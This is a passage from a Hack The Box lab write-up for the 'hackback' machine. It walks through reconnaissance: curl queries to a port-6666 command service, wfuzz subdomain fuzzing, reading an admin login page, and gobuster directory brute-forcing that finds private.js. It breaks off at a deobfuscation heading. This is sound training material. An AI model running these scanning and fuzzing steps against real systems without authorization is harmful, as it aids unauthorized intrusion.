&lt;h4 id=&quot;i-couldnt-send-a-request-to-port-6666-from-the-browser-so-i-used-curl-&quot;&gt;I couldn’t send a request to port 6666 from the browser so I used curl :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ 
&quot;Missing Command!&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-says-missing-command&quot;&gt;It says &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Missing Command!&quot;&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;so-i-tried-help-&quot;&gt;So I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/help&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help
&quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-returned-a-list-of-what-commands-we-can-use-whoami-lists-information-about-the-user-running-this-service-not-really-important-list-lists-the-files-in-the-current-directory-&quot;&gt;It returned a list of what commands we can use. &lt;code class=&quot;highlighter-rouge&quot;&gt;/whoami&lt;/code&gt; lists information about the user running this service, not really important. &lt;code class=&quot;highlighter-rouge&quot;&gt;/list&lt;/code&gt; lists the files in the current directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list
[
    {
        &quot;Name&quot;:  &quot;aspnet_client&quot;,
        &quot;length&quot;:  null
    },
    {
        &quot;Name&quot;:  &quot;default&quot;,
        &quot;length&quot;:  null
    },
    {
        &quot;Name&quot;:  &quot;new_phish&quot;,
        &quot;length&quot;:  null
    },
    {
        &quot;Name&quot;:  &quot;http.ps1&quot;,
        &quot;Length&quot;:  1867
    },
    {
        &quot;Name&quot;:  &quot;iisstart.htm&quot;,
        &quot;Length&quot;:  703
    },
    {
        &quot;Name&quot;:  &quot;iisstart.png&quot;,
        &quot;Length&quot;:  99710
    }
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;info-prints-system-information-we-might-need-that-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/info&lt;/code&gt; prints system information, we might need that :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info
{
    &quot;WindowsBuildLabEx&quot;:  &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;,
    &quot;WindowsCurrentVersion&quot;:  &quot;6.3&quot;,
    &quot;WindowsEditionId&quot;:  &quot;ServerStandard&quot;,
    &quot;WindowsInstallationType&quot;:  &quot;Server&quot;,
    &quot;WindowsInstallDateFromRegistry&quot;:  &quot;\/Date(1542436874000)\/&quot;,
    &quot;WindowsProductId&quot;:  &quot;00429-00520-27817-AA520&quot;,
    &quot;WindowsProductName&quot;:  &quot;Windows Server 2019 Standard&quot;,
    &quot;WindowsRegisteredOrganization&quot;:  &quot;&quot;,
    &quot;WindowsRegisteredOwner&quot;:  &quot;Windows User&quot;,
    &quot;WindowsSystemRoot&quot;:  &quot;C:\\Windows&quot;,
    &quot;WindowsVersion&quot;:  &quot;1809&quot;,
    &quot;BiosCharacteristics&quot;:  null,
    &quot;BiosBIOSVersion&quot;:  null,
    &quot;BiosBuildNumber&quot;:  null,
    &quot;BiosCaption&quot;:  null,
    &quot;BiosCodeSet&quot;:  null,
    &quot;BiosCurrentLanguage&quot;:  null,
    &quot;BiosDescription&quot;:  null,
    &quot;BiosEmbeddedControllerMajorVersion&quot;:  null,
    &quot;BiosEmbeddedControllerMinorVersion&quot;:  null,
    &quot;BiosFirmwareType&quot;:  null,
    &quot;BiosIdentificationCode&quot;:  null,
    &quot;BiosInstallableLanguages&quot;:  null,
    &quot;BiosInstallDate&quot;:  null,
    &quot;BiosLanguageEdition&quot;:  null,
    &quot;BiosListOfLanguages&quot;:  null,
    &quot;BiosManufacturer&quot;:  null,
    &quot;BiosName&quot;:  null,
    &quot;BiosOtherTargetOS&quot;:  null,
    &quot;BiosPrimaryBIOS&quot;:  null,
    &quot;BiosReleaseDate&quot;:  null,
    &quot;BiosSeralNumber&quot;:  null,
    &quot;BiosSMBIOSBIOSVersion&quot;:  null,
    &quot;BiosSMBIOSMajorVersion&quot;:  null,
    &quot;BiosSMBIOSMinorVersion&quot;:  null,
    &quot;BiosSMBIOSPresent&quot;:  null,
    &quot;BiosSoftwareElementState&quot;:  null,
    &quot;BiosStatus&quot;:  null,
    &quot;BiosSystemBiosMajorVersion&quot;:  null,
    &quot;BiosSystemBiosMinorVersion&quot;:  null,
    &quot;BiosTargetOperatingSystem&quot;:  null,
    &quot;BiosVersion&quot;:  null,
    &quot;CsAdminPasswordStatus&quot;:  null,
    &quot;CsAutomaticManagedPagefile&quot;:  null,
    &quot;CsAutomaticResetBootOption&quot;:  null,
    &quot;CsAutomaticResetCapability&quot;:  null,
    &quot;CsBootOptionOnLimit&quot;:  null,
    &quot;CsBootOptionOnWatchDog&quot;:  null,
    &quot;CsBootROMSupported&quot;:  null,
    &quot;CsBootStatus&quot;:  null,
    &quot;CsBootupState&quot;:  null,
    &quot;CsCaption&quot;:  null,
    &quot;CsChassisBootupState&quot;:  null,
    &quot;CsChassisSKUNumber&quot;:  null,
    &quot;CsCurrentTimeZone&quot;:  null,
    &quot;CsDaylightInEffect&quot;:  null,
    &quot;CsDescription&quot;:  null,
    &quot;CsDNSHostName&quot;:  null,
    &quot;CsDomain&quot;:  null,
    &quot;CsDomainRole&quot;:  null,
    &quot;CsEnableDaylightSavingsTime&quot;:  null,
    &quot;CsFrontPanelResetStatus&quot;:  null,
    &quot;CsHypervisorPresent&quot;:  null,
    &quot;CsInfraredSupported&quot;:  null,
    &quot;CsInitialLoadInfo&quot;:  null,
    &quot;CsInstallDate&quot;:  null,
    &quot;CsKeyboardPasswordStatus&quot;:  null,
    &quot;CsLastLoadInfo&quot;:  null,
    &quot;CsManufacturer&quot;:  null,
    &quot;CsModel&quot;:  null,
    &quot;CsName&quot;:  null,
    &quot;CsNetworkAdapters&quot;:  null,
    &quot;CsNetworkServerModeEnabled&quot;:  null,
    &quot;CsNumberOfLogicalProcessors&quot;:  null,
    &quot;CsNumberOfProcessors&quot;:  null,
    &quot;CsProcessors&quot;:  null,
    &quot;CsOEMStringArray&quot;:  null,
    &quot;CsPartOfDomain&quot;:  null,
    &quot;CsPauseAfterReset&quot;:  null,
    &quot;CsPCSystemType&quot;:  null,
    &quot;CsPCSystemTypeEx&quot;:  null,
    &quot;CsPowerManagementCapabilities&quot;:  null,
    &quot;CsPowerManagementSupported&quot;:  null,
    &quot;CsPowerOnPasswordStatus&quot;:  null,
    &quot;CsPowerState&quot;:  null,
    &quot;CsPowerSupplyState&quot;:  null,
    &quot;CsPrimaryOwnerContact&quot;:  null,
    &quot;CsPrimaryOwnerName&quot;:  null,
    &quot;CsResetCapability&quot;:  null,
    &quot;CsResetCount&quot;:  null,
    &quot;CsResetLimit&quot;:  null,
    &quot;CsRoles&quot;:  null,
    &quot;CsStatus&quot;:  null,
    &quot;CsSupportContactDescription&quot;:  null,
    &quot;CsSystemFamily&quot;:  null,
    &quot;CsSystemSKUNumber&quot;:  null,
    &quot;CsSystemType&quot;:  null,
    &quot;CsThermalState&quot;:  null,
    &quot;CsTotalPhysicalMemory&quot;:  null,
    &quot;CsPhyicallyInstalledMemory&quot;:  null,
    &quot;CsUserName&quot;:  null,
    &quot;CsWakeUpType&quot;:  null,
    &quot;CsWorkgroup&quot;:  null,
    &quot;OsName&quot;:  null,
    &quot;OsType&quot;:  null,
    &quot;OsOperatingSystemSKU&quot;:  null,
    &quot;OsVersion&quot;:  null,
    &quot;OsCSDVersion&quot;:  null,
    &quot;OsBuildNumber&quot;:  null,
    &quot;OsHotFixes&quot;:  null,
    &quot;OsBootDevice&quot;:  null,
    &quot;OsSystemDevice&quot;:  null,
    &quot;OsSystemDirectory&quot;:  null,
    &quot;OsSystemDrive&quot;:  null,
    &quot;OsWindowsDirectory&quot;:  null,
    &quot;OsCountryCode&quot;:  null,
    &quot;OsCurrentTimeZone&quot;:  null,
    &quot;OsLocaleID&quot;:  null,
    &quot;OsLocale&quot;:  null,
    &quot;OsLocalDateTime&quot;:  null,
    &quot;OsLastBootUpTime&quot;:  null,
    &quot;OsUptime&quot;:  null,
    &quot;OsBuildType&quot;:  null,
    &quot;OsCodeSet&quot;:  null,
    &quot;OsDataExecutionPreventionAvailable&quot;:  null,
    &quot;OsDataExecutionPrevention32BitApplications&quot;:  null,
    &quot;OsDataExecutionPreventionDrivers&quot;:  null,
    &quot;OsDataExecutionPreventionSupportPolicy&quot;:  null,
    &quot;OsDebug&quot;:  null,
    &quot;OsDistributed&quot;:  null,
    &quot;OsEncryptionLevel&quot;:  null,
    &quot;OsForegroundApplicationBoost&quot;:  null,
    &quot;OsTotalVisibleMemorySize&quot;:  null,
    &quot;OsFreePhysicalMemory&quot;:  null,
    &quot;OsTotalVirtualMemorySize&quot;:  null,
    &quot;OsFreeVirtualMemory&quot;:  null,
    &quot;OsInUseVirtualMemory&quot;:  null,
    &quot;OsTotalSwapSpaceSize&quot;:  null,
    &quot;OsSizeStoredInPagingFiles&quot;:  null,
    &quot;OsFreeSpaceInPagingFiles&quot;:  null,
    &quot;OsPagingFiles&quot;:  null,
    &quot;OsHardwareAbstractionLayer&quot;:  null,
    &quot;OsInstallDate&quot;:  null,
    &quot;OsManufacturer&quot;:  null,
    &quot;OsMaxNumberOfProcesses&quot;:  null,
    &quot;OsMaxProcessMemorySize&quot;:  null,
    &quot;OsMuiLanguages&quot;:  null,
    &quot;OsNumberOfLicensedUsers&quot;:  null,
    &quot;OsNumberOfProcesses&quot;:  null,
    &quot;OsNumberOfUsers&quot;:  null,
    &quot;OsOrganization&quot;:  null,
    &quot;OsArchitecture&quot;:  null,
    &quot;OsLanguage&quot;:  null,
    &quot;OsProductSuites&quot;:  null,
    &quot;OsOtherTypeDescription&quot;:  null,
    &quot;OsPAEEnabled&quot;:  null,
    &quot;OsPortableOperatingSystem&quot;:  null,
    &quot;OsPrimary&quot;:  null,
    &quot;OsProductType&quot;:  null,
    &quot;OsRegisteredUser&quot;:  null,
    &quot;OsSerialNumber&quot;:  null,
    &quot;OsServicePackMajorVersion&quot;:  null,
    &quot;OsServicePackMinorVersion&quot;:  null,
    &quot;OsStatus&quot;:  null,
    &quot;OsSuites&quot;:  null,
    &quot;OsServerLevel&quot;:  4,
    &quot;KeyboardLayout&quot;:  null,
    &quot;TimeZone&quot;:  &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;,
    &quot;LogonServer&quot;:  null,
    &quot;PowerPlatformRole&quot;:  1,
    &quot;HyperVisorPresent&quot;:  null,
    &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;:  null,
    &quot;HyperVRequirementSecondLevelAddressTranslation&quot;:  null,
    &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;:  null,
    &quot;HyperVRequirementVMMonitorModeExtensions&quot;:  null,
    &quot;DeviceGuardSmartStatus&quot;:  0,
    &quot;DeviceGuardRequiredSecurityProperties&quot;:  null,
    &quot;DeviceGuardAvailableSecurityProperties&quot;:  null,
    &quot;DeviceGuardSecurityServicesConfigured&quot;:  null,
    &quot;DeviceGuardSecurityServicesRunning&quot;:  null,
    &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;:  null,
    &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;:  null
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;services-lists-the-services-thats-also-important-and-we-might-need-it-later-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/services&lt;/code&gt; lists the services, that’s also important and we might need it later :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services
[
    {
        &quot;name&quot;:  &quot;AJRouter&quot;,
        &quot;startname&quot;:  &quot;NT AUTHORITY\\LocalService&quot;,
        &quot;displayname&quot;:  &quot;AllJoyn Router Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;ALG&quot;,
        &quot;startname&quot;:  &quot;NT AUTHORITY\\LocalService&quot;,
        &quot;displayname&quot;:  &quot;Application Layer Gateway Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;AppHostSvc&quot;,
        &quot;startname&quot;:  &quot;localSystem&quot;,
        &quot;displayname&quot;:  &quot;Application Host Helper Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },

    -------------------
    Removed Long Output
    -------------------
    
    {
        &quot;name&quot;:  &quot;WpnService&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;Windows Push Notifications System Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;WSearch&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;Windows Search&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;wuauserv&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;Windows Update&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    }
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;netstat-lists-the-listening-ports-we-can-check-that-when-we-need-to-know-about-some-internal-services-but-for-now-we-will-just-ignore-it-the-rest-of-the-commands-are-not-really-doing-anything-useful-i-tried-to-exploit-this-service-since-its-executing-system-commands-however-it-wasnt-possible&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/netstat&lt;/code&gt; lists the listening ports, we can check that when we need to know about some internal services but for now we will just ignore it. The rest of the commands are not really doing anything useful. I tried to exploit this service since it’s executing system commands, however it wasn’t possible.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-wfuzz-with-subdomains-top1million-5000txt-from-seclists-to-enumerate-any-possible-subdomains-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt&quot;&gt;subdomains-top1million-5000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; to enumerate any possible subdomains :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz --hc 614 -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.hackback.htb&quot; http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****                              
Target: http://10.10.10.128/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000007:  C=200     33 L       54 W          614 Ch        &quot;webdisk&quot;
000008:  C=200     33 L       54 W          614 Ch        &quot;pop&quot;
000001:  C=200     33 L       54 W          614 Ch        &quot;www&quot;
000002:  C=200     33 L       54 W          614 Ch        &quot;mail&quot;
000005:  C=200     33 L       54 W          614 Ch        &quot;webmail&quot;
000006:  C=200     33 L       54 W          614 Ch        &quot;smtp&quot;
000009:  C=200     33 L       54 W          614 Ch        &quot;cpanel&quot;
000010:  C=200     33 L       54 W          614 Ch        &quot;whm&quot;
000003:  C=200     33 L       54 W          614 Ch        &quot;ftp&quot;
000004:  C=200     33 L       54 W          614 Ch        &quot;localhost&quot;
000011:  C=200     33 L       54 W          614 Ch        &quot;ns1&quot;
000013:  C=200     33 L       54 W          614 Ch        &quot;autodiscover&quot;
000014:  C=200     33 L       54 W          614 Ch        &quot;autoconfig&quot;
000015:  C=200     33 L       54 W          614 Ch        &quot;ns&quot;
000016:  C=200     33 L       54 W          614 Ch        &quot;test&quot;
000012:  C=200     33 L       54 W          614 Ch        &quot;ns2&quot;
000017:  C=200     33 L       54 W          614 Ch        &quot;m&quot;
000020:  C=200     33 L       54 W          614 Ch        &quot;www2&quot;
000021:  C=200     33 L       54 W          614 Ch        &quot;ns3&quot;
000018:  C=200     33 L       54 W          614 Ch        &quot;blog&quot;
000019:  C=200     33 L       54 W          614 Ch        &quot;dev&quot;
000023:  C=200     33 L       54 W          614 Ch        &quot;forum&quot;
000022:  C=200     33 L       54 W          614 Ch        &quot;pop3&quot;
000026:  C=200     33 L       54 W          614 Ch        &quot;vpn&quot;
000025:  C=200     33 L       54 W          614 Ch        &quot;mail2&quot;
000024:  C=200     27 L       66 W          825 Ch        &quot;admin&quot;
000027:  C=200     33 L       54 W          614 Ch        &quot;mx&quot;

^C 
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;admin-gave-a-different-response-length-i-added-it-to-etchosts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; gave a different response length, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-had-this-login-form-&quot;&gt;It had this login form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-actually-didnt-do-anything-&quot;&gt;Which actually didn’t do anything :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form action=&quot;#&quot; method=&quot;post&quot;&amp;gt;
    &amp;lt;!-- USERNAME INPUT --&amp;gt;
    &amp;lt;label for=&quot;username&quot;&amp;gt;Username&amp;lt;/label&amp;gt;
    &amp;lt;input type=&quot;text&quot; placeholder=&quot;Enter Username&quot;&amp;gt;
    &amp;lt;!-- PASSWORD INPUT --&amp;gt;
    &amp;lt;label for=&quot;password&quot;&amp;gt;Password&amp;lt;/label&amp;gt;
    &amp;lt;input type=&quot;password&quot; placeholder=&quot;Enter Password&quot;&amp;gt;
    &amp;lt;input type=&quot;submit&quot; value=&quot;Log In&quot;&amp;gt;
    &amp;lt;a href=&quot;lost&quot;&amp;gt;Lost your Password?&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;a href=&quot;signup&quot;&amp;gt;Don't have An account?&amp;lt;/a&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;also-the-password-reset-and-sign-up-pages-are-non-existent-&quot;&gt;Also the password reset and sign-up pages are non-existent :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-looking-at-the-page-source-&quot;&gt;By looking at the page source :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Admin Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/css/master.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;script SRC=&quot;js/.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;login-box&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;img/logo.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;avatar&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Avatar Image&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Login Here&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- USERNAME INPUT --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- PASSWORD INPUT --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Log In&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lost&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lost your Password?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Don't have An account?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-notice-this-weird-comment-----script-srcjsjsscript---&quot;&gt;We notice this weird comment : &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!-- &amp;lt;script SRC=&quot;js/.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;however-js-gave-a-403-&quot;&gt;However &lt;code class=&quot;highlighter-rouge&quot;&gt;/js&lt;/code&gt; gave a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-js-extension-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.js&lt;/code&gt; extension :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirb/common.txt -x js
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/js/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : js
[+] Timeout      : 10s
=====================================================
2019/07/05 09:37:16 Starting gobuster
=====================================================
/private.js (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;script-deobfuscation&quot;&gt;Script Deobfuscation&lt;/h3&gt;
